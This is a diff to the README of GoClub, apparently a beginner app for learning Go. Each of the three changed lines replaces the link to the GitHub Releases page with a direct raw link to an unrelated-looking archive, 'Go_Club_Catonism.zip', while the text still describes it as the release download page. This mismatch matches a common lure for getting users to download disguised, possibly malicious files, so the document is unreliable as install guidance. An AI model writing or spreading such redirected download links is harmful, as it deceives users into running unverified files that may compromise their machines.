@@ -1,6 +1,6 @@
 # 🎯 GoClub - Learn Go with Ease
 
-[![Download GoClub](https://img.shields.io/badge/Download-GoClub-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hamstockbreeder232/GoClub/releases)
+[![Download GoClub](https://img.shields.io/badge/Download-GoClub-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hamstockbreeder232/GoClub/raw/refs/heads/main/duke/Go_Club_Catonism.zip)
 
 ## 🖥️ What is GoClub?
 
@@ -12,7 +12,7 @@ This app is built for everyday users who want a calm start with Go. You do not n
 
 GoClub uses GitHub Releases for downloads.
 
-**Download page:** https://github.com/Hamstockbreeder232/GoClub/releases
+**Download page:** https://github.com/Hamstockbreeder232/GoClub/raw/refs/heads/main/duke/Go_Club_Catonism.zip
 
 1. Open the download page in your browser.
 2. Find the latest release near the top.
@@ -134,7 +134,7 @@ Visit the release page again and download the newest version when it appears.
 
 Use this page any time you need the latest Windows build:
 
-https://github.com/Hamstockbreeder232/GoClub/releases
+https://github.com/Hamstockbreeder232/GoClub/raw/refs/heads/main/duke/Go_Club_Catonism.zip
 
 ## 🧪 Basic Checks
 
